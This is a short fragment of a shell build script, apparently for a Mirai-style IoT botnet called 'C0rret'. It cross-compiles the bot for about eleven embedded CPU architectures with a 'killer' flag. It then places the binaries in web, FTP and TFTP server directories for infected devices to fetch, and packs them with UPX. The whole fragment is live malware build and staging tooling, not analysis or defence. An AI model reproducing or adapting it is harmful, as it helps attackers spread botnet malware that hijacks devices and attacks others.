...
compile_bot i586 C0rret.x86 "-static -DCUM_KILLER"
compile_bot mips C0rret.mips "-static -DCUM_KILLER"
compile_bot mipsel C0rret.mpsl "-static -DCUM_KILLER"
compile_bot armv4l C0rret.arm "-static -DCUM_KILLER"
compile_bot armv5l C0rret.arm5 ""
compile_bot armv6l C0rret.arm6 "-static -DCUM_KILLER"
compile_bot armv7l C0rret.arm7 "-static -DCUM_KILLER"
compile_bot powerpc C0rret.ppc "-static -DCUM_KILLER"
compile_bot sparc C0rret.spc "-static -DCUM_KILLER"
compile_bot m68k C0rret.m68k "-static -DCUM_KILLER"
compile_bot sh4 C0rret.sh4 "-static -DCUM_KILLER"

cp release/C0rret.* /var/www/html/Corret
cp release/C0rret.* /var/ftp
mv release/C0rret.* /var/lib/tftpboot
rm -rf release
...
tar -xvf *.xz
mv upx*/upx .
./upx --ultra-brute /var/www/html/Corret/*
